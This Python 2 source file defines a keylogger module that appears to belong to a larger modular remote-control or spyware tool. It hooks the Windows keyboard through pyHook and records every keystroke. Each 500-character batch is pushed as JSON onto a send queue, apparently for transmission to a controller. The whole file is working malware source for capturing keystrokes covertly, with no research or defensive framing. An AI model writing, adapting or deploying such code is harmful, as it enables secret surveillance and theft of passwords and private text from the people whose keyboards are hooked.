import pyHook
import pythoncom
from abstract import AbstractModule
from json import dumps
from thread import start_new_thread


class KeyloggerModule(AbstractModule):
    def __init__(self, queue_send, event):
        super(KeyloggerModule, self).__init__(queue_send, event)

        self._keys = ''
        self._hooks_manager = pyHook.HookManager()
        self._hooks_manager.KeyDown = self._keydown

    def _execute(self):
        if self.cmd.get('cmd') == 'start':
            self._hooks_manager.HookKeyboard()
            pythoncom.PumpMessages()
        else:
            self._hooks_manager.UnhookKeyboard()

    def _keydown(self, event):
        ignore = [0, 27]

        if event.Ascii in ignore:
            return True

        if event.Ascii == 8:
            key = '<BACK>'
        elif event.Ascii == 9:
            key = '<TAB>'
        elif event.Ascii == 13:
            key = '\n'
        else:
            key = unichr(event.Ascii)

        self._keys += key

        print key

        if len(self._keys) >= 500:
            message = {
                'module': "KeyloggerModule",
                "result": self._keys
            }

            print self._keys
            self.queue_send.put(dumps(message))
            self._keys = ''

        return True
